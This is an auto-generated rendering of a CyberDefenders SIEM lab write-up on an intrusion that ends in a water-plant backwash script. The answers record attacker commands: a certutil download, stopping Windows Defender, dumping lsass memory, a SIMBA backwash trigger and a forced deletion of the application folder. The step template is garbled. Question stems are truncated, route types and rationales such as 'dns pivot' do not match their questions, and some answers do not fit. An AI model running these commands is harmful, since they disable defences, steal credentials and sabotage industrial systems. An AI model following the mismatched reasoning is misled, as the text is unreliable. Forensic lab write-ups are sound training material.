# HafinumAPT Lab

## Case Metadata

- Category: `SIEM (ELK, Splunk, etc.)`
- Platform: `CyberDefenders`
- Difficulty: `Hard`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_hafinumapt_lab.pdf`

## Why This Case Matters

Use this case as a SIEM (ELK, Splunk, etc.) reference for memory, siem, windows-events challenges.

## Input Signals

- Artifacts: memory, siem, windows-events
- Tools: elk, virustotal
- Techniques: browser-forensics, cti-enrichment, dns-analysis, http-analysis, siem-query, timeline-analysis, windows-event-analysis

## First-Principles Route

- Translate the question into searchable fields such as host, user, process, index, sourcetype, URI, IP, hash, or event code.
- Run broad time-bounded searches first, then narrow by event type, field value, and correlation chain.
- Keep the exact query shape and the evidence field that proves each answer.

## Solve Thinking

### Step 1: What is the name of the threat detected by Windows Defender?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `event.code : 1116` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `event.code : 1116`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `event.code : 1116` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Trojan:Win32/Ceprolad.A`

### Step 2: What was the full URL that Windows Defender blocked an archive from being downloaded?

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use elk with the extracted filter/query `event.code : 1117` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `event.code : 1117`
- Reasoning chain:
  - Recognize the goal as credential discovery.
  - Use elk with the extracted filter/query `event.code : 1117` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `https://download.sysinternals.com/files/Procdump.zip`

### Step 3: What was the full command used by the attacker to successfully download the archive?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/Procdump.zip"`

### Step 4: downloaded to the host?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Administrator`

### Step 5: via the command line?

- Route type: `event-log correlation`
- Why: Event-log cases should be solved by field correlation, not by reading logs chronologically.
- Probe: Use elk with the extracted filter/query `event.code : 5001` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `event.code : 5001`
- Reasoning chain:
  - Recognize the goal as event-log correlation.
  - Use elk with the extracted filter/query `event.code : 5001` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `sc stop WinDefend`

### Step 6: Which version of ProcDump did the attacker run on the host?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `10.0`

### Step 7: Where is the executable located on the disk that was targeted by Procdump to dump its process memory?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `C:\Windows\System32\lsass.exe`

### Step 8: What was the location of the dump file created from the process dumped with Procdump?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk, virustotal with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
- Tools: elk, virustotal
- Filters or commands:
  - `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk, virustotal with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `c:\tmp\lsass.dmp`

### Step 9: after it was installed?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `router7.teamviewer.com`

### Step 10: of the attack?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `brute-force attack`

### Step 11: What IP address can we send to the Firewall team for blocking?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `8.36.216.58`

### Step 12: What was the hostname from where the attacker launched their attack?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `FancyPoodle`

### Step 13: When a user authenticates using RDP , it records logon type 10 in Event ID 4624 logs. The

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `LocalSessionManager/Operational" AND event.code : 21` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `LocalSessionManager/Operational" AND event.code : 21`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `LocalSessionManager/Operational" AND event.code : 21` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `2021-03-12 08:03`

### Step 14: When did the attacker log off from the first RDP session?

- Route type: `event-log correlation`
- Why: Event-log cases should be solved by field correlation, not by reading logs chronologically.
- Probe: Use elk with the extracted filter/query `LocalSessionManager/Operational" AND event.code : 23 AND` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `LocalSessionManager/Operational" AND event.code : 23 AND`
- Reasoning chain:
  - Recognize the goal as event-log correlation.
  - Use elk with the extracted filter/query `LocalSessionManager/Operational" AND event.code : 23 AND` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `2021-03-12 08:45`

### Step 15: what Antivirus software was running on the system?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk with the extracted filter/query `winlog.provider_name : "Microsoft-Windows-Sysmon" AND event.code : 1` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `tasklist`

### Step 16: the network interface configuration of the host?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `ipconfig /all`

### Step 17: What was the name of the user account added by the attacker?

- Route type: `timeline reconstruction`
- Why: Timeline questions should be answered from normalized artifact timestamps with timezone assumptions recorded.
- Probe: Use elk to align timestamps and identify the event that satisfies the question.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as timeline reconstruction.
  - Use elk to align timestamps and identify the event that satisfies the question.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Administrator1`

### Step 18: attackers to initiate the plant backwash. What was the name of this file?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `backwash.bat`

### Step 19: Which application was responsible for downloading the malicious file to the host?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `chrome.exe`

### Step 20: From which website was this malicious file downloaded?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `wetransfer.com`

### Step 21: on the host. What was the new path of the file?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `C:\backwash.bat`

### Step 22: What command contained in the malicious file, if successfully run on the host, would you

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `C:\Program Files\ifak\SIMBA#4.3\Simba.exe --function backwash --interruptable no`

### Step 23: script would have rendered the application unusable?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `DEL /F /Q "C:\Program Files\ifak\SIMBA#4.3\*"`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
